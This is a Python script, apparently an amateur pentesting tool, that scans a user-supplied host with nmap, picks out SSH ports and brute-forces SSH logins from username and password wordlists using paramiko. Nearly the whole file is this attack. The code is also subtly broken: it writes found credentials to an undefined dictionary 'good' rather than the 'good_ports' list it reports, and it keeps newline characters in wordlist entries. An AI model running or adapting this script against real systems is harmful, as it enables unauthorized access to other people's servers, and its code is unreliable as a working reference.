import nmap, paramiko, socket


print("")
print("                                    dP                                                    dP dP ")
print("                                    88                                                    88 88 ")
print("88d888b. .d8888b. 88d888b. .d8888b. 88  .dP           88d888b.          88d888b. .d8888b. 88 88 ")
print("88'  `88 88'  `88 88'  `88 88'  `88 88888    88888888 88'  `88 88888888 88'  `88 88'  `88 88 88 ")
print("88    88 88.  .88 88       88.  .88 88   8b.          88    88          88       88.  .88 88 88 ")
print("dP    dP `8888P88 dP       `88888P' dP   `YP          dP    dP          dP       `88888P' dP dP ")
print("              .88                                                                               ")
print("          d8888P                                                                                ")
print("")
print("################################################################################################")
print("")
print("Inspired by @id2746 <>")
print("Developed by piter_pentester")
print("")
print("Version: 0.1alpha")
print("")

host = input("Enter host/ip: ") #'0.tcp.ngrok.io'

scanner = nmap.PortScanner()

ip_addr = socket.gethostbyname(host)

print("***")
print("IP: ", ip_addr)

users_list = 'users.txt'
pswords_list = 'pass.txt'

with open(users_list, 'r') as f:
    users = f.readlines()
    
with open(pswords_list, 'r') as f:
    pswords = f.readlines()

good_ports = []

print("***")
check_a = input("Do you want to scan all ports? (y/n, 'y' by default): ")

print("***")
print("Nmap Version: ", scanner.nmap_version())

if check_a == "n" or check_a == "no" or check_a == "No":
    print("***")
    port = int(input('Enter start port:\n'))
    end_port = int(input('Enter end port:\n'))
    p_range = str(port) + '-' + str(end_port)
    scanner.scan(ip_addr, p_range)
else:
    scanner.scan(ip_addr)
	
print("***")
print("Scanning...")
print("***")
#print("Ip Status: ", scanner[ip_addr].state())
#print("***")

try:
    print("Open Ports: ", scanner[ip_addr]['tcp'].keys())
    ssh_ports = []
    for p, info in scanner[ip_addr]['tcp'].items():
        if info["name"] == "ssh":
            print("***")
            print("SSH service on port", p)
            ssh_ports.append(p)
    
    for s_port in ssh_ports:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for u in users:
            for p in pswords:
                try:
                    print("***")
                    print("user:", u, "pass:", p)
                    ssh.connect(hostname=ip_addr, username=u, password=p, port=s_port)
                    good[s_port] = u + ":" + p
                    print('Good port', s_port, 'with', u, p, 'found')
                    ssh.close()
                except paramiko.ssh_exception.SSHException:
                    print("***")
                    print('Can\'t connect to', ip_addr, 'on', s_port, "SSHException. ")
                    break            
                except:
                    print("***")
                    print('Can\'t connect to', ip_addr, 'on', s_port, "Unknown error")
                    break 
            else:
                continue
            break 

    print("***")
    print ("Now you can connect to ports", good_ports, "on", ip_addr, ".")
    print("***")
    input('Done!')
except KeyError:
    print("No open ports found!")



